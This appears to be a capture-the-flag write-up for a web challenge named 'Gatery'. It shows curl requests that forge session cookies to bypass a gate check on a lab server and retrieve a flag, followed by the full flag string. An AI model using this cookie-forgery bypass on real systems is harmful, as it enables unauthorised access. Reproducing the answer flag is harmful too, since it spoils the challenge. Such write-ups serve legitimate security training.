26th July 2026  <br>
Prepared by: Vplh  <br>
Difficulty: very easy  <br>

Lysa Harrowmere reaches Crownspire with proof that a trusted castle informant is selling patrol routes to the enemy. The information is being used to ambush messengers, delay supplies, and keep Stormbound’s allies divided. The only person who can act on the proof is inside the castle for a closed council, but Lysa’s name has been removed from the entry list and the guards have orders to admit no unscheduled visitors. If she waits, the council ends and the traitor disappears with the next route packet. If she speaks openly at the gate, the proof is seized before it reaches the right hands. Lysa must trick the guarded passage, get inside, and place the evidence with the one ally who can expose the leak before the enemy moves again.

Looking at the scenario files, one thing immediately stood out:

![Scenario_Files](https://raw.githubusercontent.com/Vplh/HTB-CTF/blob/main/Web/Gatery/assets/Scenario_Files.png)


>curl -i -X POST http://154.57.164.77:30761/api/gate/enter -H "Cookie: session=admin"

    HTTP/1.1 200 OK
    Server: nginx/1.28.3
    Date: Sun, 26 Jul 2026 13:08:45 GMT
    Content-Type: application/json
    Content-Length: 29
    Connection: keep-alive
    set-cookie: session=inside.wb06PCcHAVpgc3x50X9YlAoDQHHjIO8%2BFRDPlS%2B%2FWF4; Max-Age=3600; Path=/; HttpOnly; SameSite=Lax

    {"ok":true,"insideGate":true}

>curl -i -X POST http://154.57.164.77:30761/api/flag -H "Cookie: session=inside"

    HTTP/1.1 200 OK
    Server: nginx/1.28.3
    Date: Sun, 26 Jul 2026 13:08:50 GMT
    Content-Type: application/json
    Content-Length: 82
    Connection: keep-alive

    {"ok":true,"flag":"HTB{...}"}

<details>
<summary>Final Flag</summary>

`HTB{w3lc0me_b3y0nd_th3_g4t3_05a5471cd72bbc48109d11948ff0a542}`

</details>
